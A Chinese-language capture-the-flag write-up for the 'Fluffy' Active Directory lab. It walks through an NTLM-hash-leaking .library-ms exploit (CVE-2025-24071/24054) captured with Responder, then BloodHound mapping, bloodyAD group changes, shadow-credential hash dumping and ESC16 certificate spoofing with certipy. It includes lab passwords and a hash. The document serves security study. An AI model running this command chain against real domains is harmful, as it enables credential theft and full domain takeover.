# Fluffy

- 練習日期:   2026/05/14
- 考點:       CVE-2025-24071 / CVE-2025-24054、ACL (Access Control List) 濫用、ESC16

## CVE-2025-24071 / CVE-2025-24054

這東西可以讓攻擊者製造惡意的 `.library-ms` 或 `.url` 等檔案，打包成 ZIP 後，只要受害者解壓縮檔案，或是點擊右鍵時，檔案總管會自動解析該檔案，同時向攻擊者的機器發起 SMB 連線請求。如此一來，我們可以使用 responder 來接收連線請求，進而取得受害者的 NTLM 雜湊值，甚至是明文密碼。

- [CVE-2025-24071 / CVE-2025-24054 POC](https://github.com/Marcejr117/CVE-2025-24071_PoC)

```bash
uv run --script poc.py <filename> 10.10.14.6
sudo uv run /opt/Responder/Responder.py -I tun0
```

### Bloodhound

這東西可以將 AD 環境中複雜的權限、群組及登入行為關係，以圖形化的方式呈現出來，幫助攻擊者分析潛在的攻擊路徑和弱點，快速找到從「一般使用者」提權到「Domain Admin」的最短路徑。透過 Bloodhound，可以輕鬆地識別出哪些帳戶具有高權限、哪些群組成員具有特定權限，以及如何從一個帳戶跳轉到另一個帳戶等資訊，從而制定更有效的攻擊策略。

#### 擷取方法

```bash
bloodhound-python -u 'j.fleischman' -p 'J0elTHEM4n1990!' -d 'fluffy.htb' -ns '10.129.232.88' -c All --zip
nxc ldap fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' -d fluffy.htb --dns-server 10.129.78.3 --bloodhound --collection All
```

#### 權限類型

- **MemberOf**: 表示帳戶是某個群組的成員，可以繼承群組的所有權限。
- **HasSession**: 表示帳戶在某台機器上有活躍的登入會話，可以直接存取該機器上的資源。
- **GenericAll**: 具有完全控制權限，可以修改目標帳戶的所有屬性，包括密碼。
- **GenericWrite**: 具有寫入權限，可以修改目標帳戶的部分屬性。
- **GenericRead**: 具有讀取權限，可以查看目標帳戶的部分屬性。
- **WriteDacl**: 具有修改 DACL（Discretionary Access Control List）的權限，可以改變目標帳戶的存取控制設定。

## ACL (Access Control List) 濫用

透過 CVE-2025-24071 / CVE-2025-24054，我們發現帳號 `p.agila` 及其密碼 `prometheusx-303`，緊接透過 Bloodhound，我們發現帳號 `ldap_svc`、`ca_svc` 及 `winrm_svc`。這三個帳號都具有 `GenericWrite` 權限，不過在使用這些帳號之前，依據 bloodhound 顯示的資訊（p.agila -> service account managers -> service accounts -> `ldap_svc` | `ca_svc` | `winrm_svc`），我們必須要先將 `p.agila` 加入到 `service account managers` 群組中，才能對這三個帳號進行修改，可以使用工具 `bloodyAD` 來完成。

### bloodyAD

這東西可以透過 ldap 與 AD 進行互動，主要用於修改帳戶權限。

```bash
bloodyAD -u 'p.agila' -p 'prometheusx-303' -d 'fluffy.htb' --host dc01.fluffy.htb add groupMember 'service accounts' p.agila
```

順利修改完成之後，`p.agila` 理論上會擁有 `GenericWrite` 權限，我們可以嘗試將 `winrm_svc` 及 `ca_svc` 的 NTLM hash 給 dump 出來，可以使用 `certipy-ad` 來完成。

### certipy-ad

這東西是專門針對 ADCS 的攻擊工具，提供包含憑證申請、NTLM hash dump 等功能。

```bash
## 取得 winrm_svc 的 NTLM hash
## 取得之後直接 evil-winrm-py -i dc01.fluffy.htb -u winrm_svc -H <NTLM hash> 就可以登入了
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account ca_svc -target fluffy.htb -target-ip 10.129.183.165 -dc-ip 10.129.183.165
## 嘗試檢查 ADCS 是否有漏洞
certipy-ad find -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.183.165 -vulnerable -stdout
```

## ESC16

簡單講就是當 AD 把 Global SID Extension 設定為 Disabled 時，你可以將 UPN（User Principal Name）改成 `administrator` 來騙過 CA，讓 CA 誤以為你就是 `administrator`，從而簽發憑證給你，進而取得 `administrator` 的權限。

```bash
## 檢查 ca_svc 的屬性
certipy-ad account -u winrm_svc@fluffy.htb -hashes <NTLM hash> -user ca_svc read
## 快樂改名
certipy-ad account -u winrm_svc@fluffy.htb -hashes <NTLM hash> -user ca_svc -upn administrator update
## 申請憑證
certipy-ad req -u ca_svc -hashes <NTLM hash> -dc-ip 10.10.11.69 -target dc01.fluffy.htb -ca fluffy-DC01-CA -template User
## 名稱改回來 <很重要，一定要改回來，否則 AD 會對應不到真實的 administrator>
certipy-ad account -u winrm_svc@fluffy.htb -hashes <NTLM hash> -user ca_svc -upn ca_svc@fluffy.htb update
## 使用取得的憑證登入
certipy-ad auth -dc-ip 10.10.11.69 -pfx administrator.pfx -u administrator -domain fluffy.htb
```